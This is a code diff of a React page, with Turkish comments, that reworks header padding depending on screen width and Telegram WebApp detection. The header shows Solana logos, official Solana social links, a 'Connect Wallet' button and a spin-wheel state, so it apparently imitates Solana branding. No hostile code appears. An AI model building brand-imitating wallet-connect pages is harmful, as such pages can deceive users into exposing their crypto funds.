@@ -45,15 +45,19 @@ export default function Page() {
   }, [])
 
 
-    /* ——— Dinamik üst boşluk durumu ——— */
-  const [topOffset, setTopOffset] = useState<string>('20px')
-  useEffect(() => {
-    const isTelegram = !!(window as any).Telegram?.WebApp
-    const w = window.innerWidth
-    if (!isTelegram && w >= 320 && w <= 499) {
-      setTopOffset('8px')
-    }
-  }, [])
+/* ——— Dinamik üst boşluk durumu ——— */
+const [headerPadding, setHeaderPadding] = useState<string>('')
+useEffect(() => {
+  const update = () => {
+    const isTelegram = Boolean((window as any).Telegram?.WebApp)
+    const w          = window.innerWidth
+    // Telegram dışında ve 320–499px arasındaysa 8px, aksi halde boş bırak
+    setHeaderPadding(!isTelegram && w >= 320 && w <= 499 ? '8px' : '')
+  }
+  update()
+  window.addEventListener('resize', update)
+  return () => window.removeEventListener('resize', update)
+}, [])
 
 
   /* ——— Çark (spin) durumu ——— */
@@ -294,48 +298,56 @@ export default function Page() {
             </div>
           </div>
 
-    {/* ---------- HEADER ---------- */}
-    <section className="_b">
-      <div
-        className="_d"
-        style={topOffset ? { paddingTop: topOffset } : undefined}
-      >
-        <div className="_x">
-          <div className="_0">
-            <a href="#!" className="_h">
-              <img src="/header_logo.svg" alt="Solana logo" />
-            </a>
-            <a href="#!" className="_w">
-              <img src="/alik.png" className="_t" alt="avatar" />
-            </a>
-          </div>
-          <div className="_0">
-            <div className="_6">
-              <a href="https://x.com/solana?mx=2" target="_blank" rel="noreferrer">
-                <img src="/header_twitter.svg" alt="Twitter" />
-              </a>
-              <a href="https://t.me/solana" target="_blank" rel="noreferrer">
-                <img src="/header_tg.svg" alt="Telegram" />
-              </a>
-              <a href="https://www.youtube.com/SolanaFndn" target="_blank" rel="noreferrer">
-                <img src="/header_mail.svg" alt="YouTube" />
-              </a>
-              <a href="https://discord.com/invite/kBbATFA7PW" target="_blank" rel="noreferrer">
-                <img src="/header_ds.svg" alt="Discord" />
-              </a>
-            </div>
-          </div>
-          <div className="_0">
-            <button onClick={handleConnect} className="_n">
-              <span className="_a">
-                {publicKey ? 'Wallet connected' : 'Connect Wallet'}
-              </span>
-              <img src="/header_arrow.svg" alt="→" />
-            </button>
-          </div>
+{/* ---------- HEADER ---------- */}
+<section className="_b">
+  <div
+    className="_d"
+    style={
+      // Sadece Telegram WebApp içinde değilsek ve 320–499px arasındaysak 8px boşluk uygula
+      !window.Telegram?.WebApp?.initData &&
+      window.innerWidth >= 320 &&
+      window.innerWidth <= 499
+        ? { paddingTop: '8px' }
+        : undefined
+    }
+  >
+    <div className="_x">
+      <div className="_0">
+        <a href="#!" className="_h">
+          <img src="/header_logo.svg" alt="Solana logo" />
+        </a>
+        <a href="#!" className="_w">
+          <img src="/alik.png" className="_t" alt="avatar" />
+        </a>
+      </div>
+      <div className="_0">
+        <div className="_6">
+          <a href="https://x.com/solana?mx=2" target="_blank" rel="noreferrer">
+            <img src="/header_twitter.svg" alt="Twitter" />
+          </a>
+          <a href="https://t.me/solana" target="_blank" rel="noreferrer">
+            <img src="/header_tg.svg" alt="Telegram" />
+          </a>
+          <a href="https://www.youtube.com/SolanaFndn" target="_blank" rel="noreferrer">
+            <img src="/header_mail.svg" alt="YouTube" />
+          </a>
+          <a href="https://discord.com/invite/kBbATFA7PW" target="_blank" rel="noreferrer">
+            <img src="/header_ds.svg" alt="Discord" />
+          </a>
         </div>
       </div>
-    </section>
+      <div className="_0">
+        <button onClick={handleConnect} className="_n">
+          <span className="_a">
+            {publicKey ? 'Wallet connected' : 'Connect Wallet'}
+          </span>
+          <img src="/header_arrow.svg" alt="→" />
+        </button>
+      </div>
+    </div>
+  </div>
+</section>
+
 
 
           {/* ---------- MAIN SECTION ---------- */}
